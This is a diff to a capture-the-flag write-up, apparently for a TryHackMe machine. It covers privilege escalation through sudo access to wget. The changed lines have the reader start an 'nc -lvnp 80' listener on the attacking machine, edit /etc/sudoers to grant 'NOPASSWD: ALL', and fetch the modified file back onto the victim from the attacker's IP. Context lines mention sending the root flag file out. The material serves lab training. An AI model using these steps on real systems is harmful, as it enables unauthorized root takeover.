@@ -220,7 +220,9 @@ So We have sudo permissions for wget, I wonder what we can do.
 * Read Files on PWN machine
 
 So we can directly upload /root/root_flag.txt to Our machine but thats not enough in real life.
-So we will rewrite the `/etc/sudoers` file. 
+So we will rewrite the `/etc/sudoers` file. This file is responsible for giving sudo-without-password permissions to various users and programs
+
+Start a reverse shell listener on your attacking machine
 
 ```nc -lvnp 80```
 
@@ -287,7 +289,7 @@ Edit out the `NOPASSWD: /usr/bin/wget` Portion to `NOPASSWD: ALL` using ONLY `VI
 
 ![](2021-06-25-17-49-30.png)
 
-And upload it back to machine
+And download it back to victim machine
 
 ```SH
 URL=http://{YOUR-IP alloted from THM}/sudoer2
